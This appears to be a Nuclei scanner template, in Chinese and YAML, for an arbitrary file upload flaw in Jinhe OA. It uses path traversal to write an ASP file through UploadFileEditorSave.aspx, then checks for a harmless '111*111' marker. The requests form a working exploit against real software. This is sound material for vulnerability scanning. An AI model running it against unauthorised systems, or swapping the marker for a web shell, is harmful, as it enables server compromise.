id: jinheOA-uploadfileeditorsave-file-upload

info:
  name: 金和OA_uploadfileeditorsave接口存在任意文件上传漏洞
  author: cnaq
  severity: high
  description: 金和OA_uploadfileeditorsave接口存在任意文件上传漏洞
  reference:
    - https://github.com/wy876/POC/blob/main/%E9%87%91%E5%92%8COA_uploadfileeditorsave%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  tags: jinheOA,download,file,read

requests:
  - raw:
      - |
        POST /C6/Control/UploadFileEditorSave.aspx?filename=\....\....\C6\qps4cckjuz.asp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
        Connection: close
        Content-Length: 191
        Content-Type: multipart/form-data; boundary=----9fh1lo9qobtszaiahg6v
        Accept-Encoding: gzip, deflate

        ------9fh1lo9qobtszaiahg6v
        Content-Disposition: form-data; name="file"; filename="qps4cckjuz.jpg"
        Content-Type: image/png

        <% response.write(111*111)
        %>

        ------9fh1lo9qobtszaiahg6v--

      - |
        GET /C6/qps4cckjuz.asp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - '200'
      - type: regex
        part: body
        regex:
          - '12321'